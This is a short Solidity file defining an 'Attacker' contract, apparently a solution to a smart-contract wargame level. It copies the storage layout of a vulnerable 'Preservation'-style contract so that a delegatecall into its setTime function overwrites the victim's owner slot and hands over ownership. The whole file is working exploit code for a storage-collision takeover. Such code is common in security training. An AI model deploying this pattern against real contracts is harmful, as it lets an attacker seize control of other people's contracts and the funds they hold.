// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Attacker {
    // Initialize same slots as Prevervation contract to point at the owner slot.
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    
    // Set time can change the owner if its input is an address encoded as a uint256
    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}